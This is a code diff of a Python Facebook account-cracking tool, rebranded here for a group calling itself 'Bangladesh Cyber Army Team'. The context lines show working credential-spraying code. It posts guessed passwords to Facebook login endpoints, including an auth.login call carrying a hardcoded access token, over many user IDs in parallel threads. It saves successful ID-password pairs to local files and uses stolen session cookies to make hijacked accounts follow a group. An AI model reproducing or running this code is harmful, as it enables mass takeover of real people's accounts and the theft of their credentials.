@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ ADI ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ ᗷ.ᑕ.ᗩ. ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,14 +324,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ ADI-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ ᗷ.ᑕ.ᗩ.-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ ADI-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ ᗷ.ᑕ.ᗩ.-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ ADI ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ ᗷ.ᑕ.ᗩ. ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,14 +362,14 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ ADI-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ ᗷ.ᑕ.ᗩ.-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ ADI-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ ᗷ.ᑕ.ᗩ.-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ADI-OK.txt','a').write('%s\n' % wrt)
@@ -383,7 +383,7 @@ def free(idf,pwv):
 	loop+=1
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	r = sop(ses.get('https://www.facebook.com/ADIRTTA?mibextid=ZbWKwL', cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://www.facebook.com/groups/1153476152467431/?ref=share&mibextid=NSMWBT', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
@@ -395,13 +395,15 @@ logo = ("""\033[38;5;46m
   \033[38;5;46m║ \033[38;5;46mB    B  C       A    A ║
   \033[38;5;46m║ \033[38;5;46mBBBBB   CCCCC   A    A ║                                 
   \033[38;5;46m╚════════════════════════╝
-\033[38;5;46m╔═════════════╗  ࿇⃝🌹⃢A🌹⃝࿇  \033[38;5;46m╔══════════════════╗
-\033[38;5;46m║[❗]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢D🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐀𝐃𝐈𝐑𝐓𝐓𝐀           ║
-\033[38;5;46m║[❗]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢I🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐀𝐃𝐈𝐑𝐓𝐓𝐀           ║
-\033[38;5;46m║[❗]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢R🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐀𝐃𝐈𝐑𝐓𝐓            ║
-\033[38;5;46m║[❗]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢T🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐀𝐃𝐈𝐑𝐓𝐓𝐀           ║                          
-\033[38;5;46m║[❗]\033[38;5;46m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢T🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║                          
-\033[38;5;46m╚═════════════╝  ࿇⃝🌹⃢A🌹⃝࿇  \033[38;5;46m╚══════════════════╝\033[1;37m
+  \033[38;5;46mA tool for BANGLADESH CYBER ARMY TEAM
+
+\033[38;5;46m╔═════════════╗  ࿇⃝🌹⃢A🌹⃝࿇  \033[38;5;46m╔══════════════════════════════╗
+\033[38;5;46m║[🤎]\033[38;5;46m𝐂𝐨𝐝𝐞 𝐛𝐲  ║  ࿇⃝🌹⃢D🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐀𝐃𝐈𝐑𝐓𝐓𝐀                       ║
+\033[38;5;46m║[💛]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢I🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐒𝐇𝐈𝐍𝐂𝐇𝐎𝐘𝐎𝐍 𝐁𝐀𝐑𝐔𝐀 𝐀𝐃𝐈𝐑𝐓𝐓𝐀      ║
+\033[38;5;46m║[🧡]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢R🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐀𝐃𝐈𝐑𝐓𝐓                        ║
+\033[38;5;46m║[💚]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢T🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐀𝐃𝐈𝐑𝐓𝐓𝐀                       ║
+\033[38;5;46m║[💜]\033[38;5;46m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢T🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇                    ║
+\033[38;5;46m╚═════════════╝  ࿇⃝🌹⃢A🌹⃝࿇  \033[38;5;46m╚══════════════════════════════╝\033[1;37m
  """)
 
 class Main:
@@ -419,7 +421,7 @@ class Main:
 		print(" [5]\033[38;5;46m2011-14 Cloning")
 		print(" [E]\033[38;5;46mExit Programming\n")
 		TALHA =input(" Choose ")
-		os.system('xdg-open https://www.facebook.com/ADIRTTA?mibextid=ZbWKwL/')
+		os.system('xdg-open https://www.facebook.com/groups/1153476152467431/?ref=share&mibextid=NSMWBT/')
 		if TALHA in ["1", "01"]:
 			File()
 		if TALHA in ["2", "02"]:
@@ -831,7 +833,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ ADI💣 ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ ᗷ.ᑕ.ᗩ. ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -848,13 +850,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ ADI-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ᗷ.ᑕ.ᗩ.-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-ADI-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ ADI-ok ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ᗷ.ᑕ.ᗩ.-ok ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-ADI-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -1258,7 +1260,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ ADI ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ ᗷ.ᑕ.ᗩ. ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1275,13 +1277,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ ADI-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ ᗷ.ᑕ.ᗩ.-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-ADI-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[38;5;46m[ ADI-ok ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[38;5;46m[ ᗷ.ᑕ.ᗩ.-ok ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-ADI-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -1367,6 +1369,5 @@ def sexy():
 with ThreadPool(max_workers=90) as jjj:
     jjj.submit(sexy)
     jjj.submit(Main)
-
 
 
